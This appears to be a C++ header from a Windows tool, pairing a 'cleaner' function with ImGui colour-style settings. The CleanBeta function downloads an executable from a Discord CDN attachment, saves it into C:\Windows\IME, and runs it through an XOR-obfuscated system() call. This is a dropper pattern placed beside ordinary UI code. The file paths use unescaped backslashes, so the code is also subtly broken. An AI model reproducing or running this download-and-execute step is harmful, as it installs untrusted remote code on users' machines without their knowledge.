#pragma once
#include "includes.h"


namespace Apple {

	void CleanBeta()
	{
		//made by ritz#9999
		string dwnld_URL = "https://cdn.discordapp.com/attachments/812106475106336769/813323501485686804/cleaner.exe";
		string savepath = "C:\Windows\IME\cleaner.exe";
		URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
		//Sleep(1000);
		system(_xor_("start C:\Windows\IME\cleaner.exe").c_str());
		Sleep(70000);
		
	}

	void CleanNormal()
	{
		//soon
	}

	void CleanOld()
	{
		//soon
	}

	namespace ImGuiRender {

		void ApplyAppleStyle()
		{
			ImVec4* colors = ImGui::GetStyle().Colors;
			colors[ImGuiCol_Text] = ImColor(255, 255, 255);
			colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
			colors[ImGuiCol_WindowBg] = ImColor(255, 254, 255);
			
			colors[ImGuiCol_PopupBg] = ImVec4(0.08f, 0.08f, 0.08f, 0.94f);
			colors[ImGuiCol_Border] = ImVec4(0.43f, 0.43f, 0.50f, 0.50f);
			colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
			colors[ImGuiCol_FrameBg] = ImColor(217, 217, 217);
			colors[ImGuiCol_FrameBgHovered] = ImColor(217, 217, 217);
			colors[ImGuiCol_FrameBgActive] = ImColor(217, 217, 217);
			colors[ImGuiCol_TitleBg] = ImVec4(0.00f, 0.00f, 0.00f, 1.00f);
			colors[ImGuiCol_TitleBgActive] = ImVec4(0.00f, 0.00f, 0.00f, 1.00f);
			colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.00f, 0.00f, 0.00f, 1.00f);
			colors[ImGuiCol_MenuBarBg] = ImVec4(0.00f, 0.00f, 0.00f, 1.00f);
			colors[ImGuiCol_ScrollbarBg] = ImVec4(0.02f, 0.02f, 0.02f, 0.53f);
			colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.16f, 0.29f, 0.48f, 0.54f);
			colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.41f, 0.41f, 0.41f, 1.00f);
			colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.51f, 0.51f, 0.51f, 1.00f);
			colors[ImGuiCol_CheckMark] = ImColor(15, 14, 16);
			colors[ImGuiCol_SliderGrab] = ImVec4(0.24f, 0.52f, 0.88f, 1.00f);
			colors[ImGuiCol_SliderGrabActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
			colors[ImGuiCol_Button] = ImColor(169, 169, 169, 255);
			colors[ImGuiCol_ButtonHovered] = ImColor(105, 105, 105, 255);
			colors[ImGuiCol_ButtonActive] = ImColor(169, 169, 169, 255);
			colors[ImGuiCol_Header] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
			colors[ImGuiCol_HeaderHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.80f);
			colors[ImGuiCol_HeaderActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
			
			colors[ImGuiCol_ResizeGrip] = ImVec4(0.26f, 0.59f, 0.98f, 0.25f);
			colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.67f);
			colors[ImGuiCol_ResizeGripActive] = ImVec4(0.26f, 0.59f, 0.98f, 0.95f);
			colors[ImGuiCol_PlotLines] = ImVec4(0.61f, 0.61f, 0.61f, 1.00f);
			colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
			colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
			colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
			colors[ImGuiCol_TextSelectedBg] = ImVec4(0.26f, 0.59f, 0.98f, 0.35f);
			colors[ImGuiCol_ModalWindowDarkening] = ImVec4(0.80f, 0.80f, 0.80f, 0.35f);
			

			ImGui::SetNextWindowSize(ImVec2(422, 294), ImGuiSetCond_FirstUseEver);
			ImGuiStyle& style = ImGui::GetStyle();

			style.WindowRounding = 0.0f;
			
			style.FrameRounding = 0.0f;
			style.GrabRounding = 0.0f;
			
			style.ScrollbarRounding = 0.0f;

			//color not very good , will change later
		}


	}
}
